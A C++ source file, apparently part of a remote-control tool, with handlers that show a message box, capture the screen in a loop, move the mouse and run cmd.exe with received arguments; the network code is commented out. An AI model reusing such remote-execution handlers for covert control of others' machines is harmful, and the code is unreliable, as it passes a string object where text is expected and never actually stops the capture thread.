#include "..\pch.h"

#include "Commands.hpp"
//#include "..\Network\UDPConnection.hpp"
#include "ScreenCapturer.hpp"
#include "..\Debugger.h"

std::string ExecuteCommand(INT code, std::string &args)
{
	static std::string result(RESULT_LENGTH, { });

	$I(TEXT("cmd:'%d', args:'%s'\n"), code, args.c_str());

	auto it = std::find_if(std::begin(MAP_COMMANDS), std::end(MAP_COMMANDS), [&](auto pair) { return static_cast<INT>(pair.first.second) == code; });
	if (it != std::end(MAP_COMMANDS))
	{
		it->second(&args, result);

		return result;
	}

	return UNDEFINEDA;
}

VOID _on_task_MESSAGEBOX(CONST PVOID args, std::string &result)
{
	if (!MessageBoxEx(NULL, ((std::string*)args)->c_str(), TEXTH("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)))
		result = TASK_FAILUREA;
	else
		result = TASK_SUCCESSA;
}

VOID SendDesktopScreen()
{
	static DirectXParametrs dxp;
	//static UDPClient udpclient;
	static BOOL init = FALSE;

	//if (!init && udpclient.init() && dxp.init())
	//	init = TRUE;
	
	while (TRUE)
	{
		auto pair = CaptureScreen(&dxp);

		std::cout << pair.second;

		//udpclient.send(std::to_string(pair.second));
		//udpclient.send(std::string(reinterpret_cast<char*>(pair.first)));

		if(pair.first)
			delete[] pair.first;
	}
}

VOID _on_task_VIEWDESKTOP(CONST PVOID args, std::string &result)
{
	static HANDLE hThread = NULL;

	int x = 0;
	if (_stscanf_s(reinterpret_cast<std::string*>(args)->c_str(), TEXT("%d"), &x) == 0) // No args == start or work(if started)
	{
		if (!hThread)
		{
			hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&SendDesktopScreen), 0, 0, NULL);
			if(!hThread)
				result = TASK_FAILUREA;
			else
				result = TASK_SUCCESSA;
		}
		else
			result = TASK_SUCCESSA;
	}
	else
	{
		if(!CloseHandle(hThread))
			result = TASK_FAILUREA;
		else
			result = TASK_SUCCESSA;
	}
}

VOID _on_task_MOUSECTRL(CONST PVOID args, std::string &result)
{
	INT x = 0,
		y = 0;

	std::stringstream sstr(*reinterpret_cast<std::string*>(args));
	sstr >> x >> y;

	if (!SetCursorPos(x, y))
	{
		PrintError(TEXTH("SetCursorPos"), GetLastError());

		result = TASK_FAILUREA;
	}
	else
		result = TASK_SUCCESSA;
}

VOID _on_task_EXECUTECMD(CONST PVOID args, std::string &result)
{
	SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
	shell.fMask            = SEE_MASK_DEFAULT;
	shell.lpVerb           = TEXT("open"); // Yep, i know that it is a default value
	shell.lpFile           = TEXT("cmd.exe");
	shell.lpParameters     = static_cast<PTCHAR>(args);
	shell.nShow            = SW_SHOW;
	if (!ShellExecuteEx(&shell))
		result = TASK_FAILUREA;
	else
		result = TASK_SUCCESSA;
}

Command cmd2code(CONST std::string &cmd)
{
	auto it = std::find_if(std::begin(MAP_COMMANDS), std::end(MAP_COMMANDS), [&](auto pair) { return pair.first.first == cmd; });

	return (it == std::end(MAP_COMMANDS) ? Command::UNDEFINEDCMD : it->first.second);
}

std::string code2cmd(Command cmd)
{ 
	auto it = std::find_if(std::begin(MAP_COMMANDS), std::end(MAP_COMMANDS), [&](auto pair) { return pair.first.second == cmd; });

	return (it == std::end(MAP_COMMANDS) ? UNDEFINEDA : it->first.first);
}